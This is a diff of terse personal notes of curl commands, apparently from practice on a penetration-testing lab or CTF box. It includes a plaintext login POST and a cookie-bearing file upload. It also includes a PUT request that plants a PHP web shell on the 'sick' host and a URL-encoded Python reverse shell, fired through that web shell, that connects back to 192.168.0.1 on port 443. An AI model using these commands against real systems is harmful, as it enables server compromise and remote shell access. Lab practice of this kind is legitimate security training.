@@ -1,3 +1,4 @@
+______________use the curl -v switch
 curl 127.0.0.1:<port number>
 curl -v -X POST -d "user=kent&pass=JWzXuBJJNy&submit=Login" "http://10.0.2.13/?page=login"
  curl -v -X POST -H "Content-Type: multipart/form-data" -F "file=@test.gif;submit" -F "submit=Upload" -b "PHPSESSID=o0gujk45afugl9goa3d; path=/" "http://10.0.2.13/?page=upload"
@@ -14,10 +15,11 @@ curl --cookie "PHPSESSID=ktfvs9nfcnn4h13ee5f8hajcd1" -o upload.b64 "http://owl/u
 
 
 
+
 ***************_________Upload curl
 
 curl -X PUT -d '<?php system($_GET["c"]);' http://sick/test/1.php
 
 ++++++++++++++++++++++++++++++++
-curl "http://sick/test/1.php?c=python+-c+%27import+socket%2csubprocess%2cos%3bs%3dsocket.socket(socket.AF_INET%2csocket.SOCK_STREAM)%3bs.connect((%22192.168.0.254%22%2c443))%3bos.dup2(s.fileno()%2c0)%3b+os.dup2(s.fileno()%2c1)%3b+os.dup2(s.fileno()%2c2)%3bp%3dsubprocess.call(%5b%22%2fbin%2fsh%22%2c%22-i%22%5d)%3b%27"
-
+curl "http://sick/test/1.php?c=python+-c+%27import+socket%2csubprocess%2cos%3bs%3dsocket.socket(socket.AF_INET%2csocket.SOCK_STREAM)%3bs.connect((%22192.168.0.1%22%2c443))%3bos.dup2(s.fileno()%2c0)%3b+os.dup2(s.fileno()%2c1)%3b+os.dup2(s.fileno()%2c2)%3bp%3dsubprocess.call(%5b%22%2fbin%2fsh%22%2c%22-i%22%5d)%3b%27"
+ericdoesntdrinkhisownpee
